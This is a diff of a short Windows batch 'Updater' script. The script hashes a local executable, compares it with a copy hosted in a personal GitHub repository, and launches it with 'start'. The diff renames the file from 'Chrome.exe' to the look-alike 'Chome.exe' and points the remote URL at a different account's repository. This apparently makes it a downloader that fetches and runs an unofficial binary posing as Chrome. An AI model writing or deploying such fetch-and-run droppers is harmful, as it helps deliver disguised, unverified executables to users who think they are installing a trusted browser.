@@ -2,8 +2,8 @@
 setlocal enabledelayedexpansion
 
 REM --- CONFIG ---
-set "LOCAL_FILE=Chrome.exe"
-set "REMOTE_FILE_URL=https://raw.githubusercontent.com/A7mad3109v2/Updater/refs/heads/main/Chrome.exe"
+set "LOCAL_FILE=Chome.exe"
+set "REMOTE_FILE_URL=https://raw.githubusercontent.com/luvxc1de/Updater/refs/heads/main/Chome.exe"
 
 REM --- COMPUTE LOCAL HASH ---
 for /f "tokens=1" %%A in ('certutil -hashfile "%LOCAL_FILE%" SHA256 ^| find /i /v "hash" ^| find /i /v "CertUtil"') do (
@@ -30,4 +30,5 @@ if "!LOCAL_HASH!" neq "!REMOTE_HASH!" (
 
 REM --- RUNNING FILE ---
 start "" "%LOCAL_FILE%"
+
 exit
